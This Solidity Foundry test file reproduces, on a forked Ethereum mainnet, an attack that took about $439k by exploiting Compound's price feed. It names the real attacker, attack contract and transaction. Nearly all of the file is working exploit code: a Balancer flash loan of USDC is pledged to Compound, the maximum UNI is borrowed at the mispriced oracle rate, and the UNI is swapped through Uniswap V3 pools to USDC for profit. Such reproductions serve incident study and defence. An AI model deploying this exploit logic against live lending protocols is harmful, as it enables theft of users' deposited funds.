// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~439537 US$
// Attacker : 0xe000008459b74a91e306a47c808061dfa372000e
// Attack Contract : 0x2f99fb66ea797e7fa2d07262402ab38bd5e53b12
// Vulnerable Contract : Compound protocol's price feeder, 0x50ce56A3239671Ab62f185704Caedf626352741e
// Attack Tx : https://etherscan.io/tx/0xaee0f8d1235584a3212f233b655f87b89f22f1d4890782447c4ef742b37af58d

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x50ce56A3239671Ab62f185704Caedf626352741e#code

// @Analysis
// Lending Dashboard : https://debank.com/profile/0x2f99fb66ea797e7fa2d07262402ab38bd5e53b12
// Twitter Guy : https://twitter.com/0xLEVI104/status/1762092203894276481

contract ContractTest is Test {

    IBalancerVault public vault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IERC20 public USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    ICompoundcUSDC public cUSDC = ICompoundcUSDC(0x39AA39c021dfbaE8faC545936693aC917d5E7563);
    IComptroller public comptroller = IComptroller(0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B);
    IcUniToken public cUniToken = IcUniToken(0x35A18000230DA775CAc24873d00Ff85BccdeD550);
    IUNIV3Pool public UNI_WETH_Pool = IUNIV3Pool(0x1d42064Fc4Beb5F8aAF85F4617AE8b3b5B8Bd801);
    IUNI public uni = IUNI(0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984);
    IUNIV3Pool public WETH_USDC_Pool = IUNIV3Pool(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640);
    IWETH public WETH = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    IUniswapAnchoredView public UniswapAnchoredView = IUniswapAnchoredView(0x50ce56A3239671Ab62f185704Caedf626352741e);

    uint256 public AMOUNT = 193020254960;

    function setUp() public {
        vm.createSelectFork("mainnet", 19290921 - 1);
        vm.label(address(vault), "Balancer vault");
        vm.label(address(USDC), "USDC");
        vm.label(address(cUSDC), "cUSDC");
        vm.label(address(comptroller), "comptroller");
        vm.label(address(cUniToken), "cUniToken");
        vm.label(address(UNI_WETH_Pool), "UNI_WETH_Pool");
        vm.label(address(uni), "uni");
        vm.label(address(WETH_USDC_Pool), "WETH_USDC_Pool");
        vm.label(address(WETH), "WETH");
    }

    function testExploit() public {
        console.log("USDC balance:");
        emit log_named_decimal_uint("   [INFO] Before attack", USDC.balanceOf(address(this)), 6);

        address[] memory tokens = new address[](1);
        uint256[] memory amounts = new uint256[](1);
        tokens[0] = address(USDC);
        amounts[0] = AMOUNT;
        vault.flashLoan(address(this), tokens, amounts, bytes(""));
        
        emit log_named_decimal_uint("   [INFO] After attack", USDC.balanceOf(address(this)), 6);
        console.log("When compound update the price, incomplete liquidation leading to bad debts");
    }

    function receiveFlashLoan(
        IERC20[] memory,
        uint256[] memory,
        uint256[] memory,
        bytes memory
    ) public {
        // pledge the USDC
        USDC.approve(address(cUSDC), AMOUNT);
        cUSDC.mint(AMOUNT);
        address[] memory cTokens = new address[](1);
        cTokens[0] = address(cUSDC);
        comptroller.enterMarkets(cTokens);
        
        // You should calculate the max u can borrow
        (, uint myTotalLiquidity,) = comptroller.getAccountLiquidity(address(this));

        // The max amount of UNI we can borrow = AccountLiquidity / UNI's price in compound
        uint256 max_UNI_borrow = 
            myTotalLiquidity / 
            UniswapAnchoredView.getUnderlyingPrice(address(cUniToken)) * 
            10 ** uni.decimals();
        cUniToken.borrow(max_UNI_borrow); 

        // Swap: UNI => WETH => USDC, for the low Slippage
        UNI_WETH_Pool.swap(address(this), true, int(uni.balanceOf(address(this))), 42095128740, bytes(""));
        WETH_USDC_Pool.swap(address(this), false, int(WETH.balanceOf(address(this))), 1461446703485210103287273052203988822378723970341, bytes(""));

        USDC.transfer(msg.sender, AMOUNT); // pay back flashloan
    }

    uint256 public num = 0;
    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata) public {
        // For the twice swap()
        if(num == 0) {
            uni.transfer(msg.sender, uint256(amount0Delta));
            num++;
        } else {
            WETH.transfer(msg.sender, uint256(amount1Delta));
        }
    }

}

interface ICompoundcUSDC {
    function mint(uint256 mintAmount) external returns (uint256);
}

interface IComptroller {
    function enterMarkets(address[] memory cTokens)external returns (uint256[] memory);
    function getAccountLiquidity(address account)external view returns (uint256, uint256,uint256);
}

interface IcUniToken {
    function borrow(uint256 borrowAmount) external returns (uint256);
}

interface IUNIV3Pool {
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes memory data
    ) external returns (int256 amount0, int256 amount1);
}

interface IUNI {
    function balanceOf(address account) external view returns (uint256);
    function decimals() external view returns (uint8);
    function transfer(address dst, uint256 rawAmount) external returns (bool);
}

interface IUniswapAnchoredView {
    function getUnderlyingPrice(address cToken) external view returns (uint256);
}